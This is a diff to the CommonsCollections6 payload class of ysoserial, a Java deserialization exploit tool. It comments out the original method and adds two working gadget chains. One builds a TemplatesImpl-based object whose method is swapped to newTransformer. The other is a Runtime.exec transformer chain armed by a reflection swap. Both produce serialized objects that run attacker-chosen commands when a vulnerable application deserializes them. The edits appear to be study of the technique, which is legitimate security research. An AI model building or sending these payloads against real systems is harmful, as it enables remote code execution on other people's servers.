@@ -8,6 +8,7 @@ import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
@@ -38,7 +39,7 @@ import java.util.Map;
 @Authors({ Authors.MATTHIASKAISER })
 public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<Serializable> {
 
-    public Serializable getObject(final String command) throws Exception {
+    /*public Serializable getObject(final String command) throws Exception {
 
         final String[] execArgs = new String[] { command };
 
@@ -70,7 +71,7 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
         } catch (NoSuchFieldException e) {
             f = HashSet.class.getDeclaredField("backingMap");
         }
-
+        // 先拿到内部的 HashMap 成员 instance
         Reflections.setAccessible(f);
         HashMap innimpl = (HashMap) f.get(map);
 
@@ -101,6 +102,58 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
 
         return map;
 
+    }*/
+
+    public Serializable getObject(final String command) throws Exception {
+        Object templatesImpl = Gadgets.createTemplatesImpl(command);
+
+        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
+
+        final Map innerMap = new HashMap();
+        final Map lazyMap = LazyMap.decorate(innerMap, transformer);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, templatesImpl);
+
+        final HashMap expMap = new HashMap();
+        expMap.put(entry, "valuevalue");
+
+        lazyMap.clear();
+        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
+
+        return expMap;
+    }
+
+    public Serializable getObject1(final String command) throws Exception {
+        final String[] execArgs = new String[] { command };
+
+        final Transformer[] fake = new Transformer[] { new ConstantTransformer(1) };
+
+        final Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        "getRuntime", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer("exec",
+                        new Class[] { String.class }, execArgs),
+                new ConstantTransformer(1) };
+
+        Transformer transformerChain = new ChainedTransformer(fake);
+
+        final Map innerMap = new HashMap();
+
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+
+        HashMap expMap = new HashMap();
+        expMap.put(entry, "valuevalue");
+
+        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+        lazyMap.remove("foo");
+
+        return expMap;
     }
 
     public static void main(final String[] args) throws Exception {
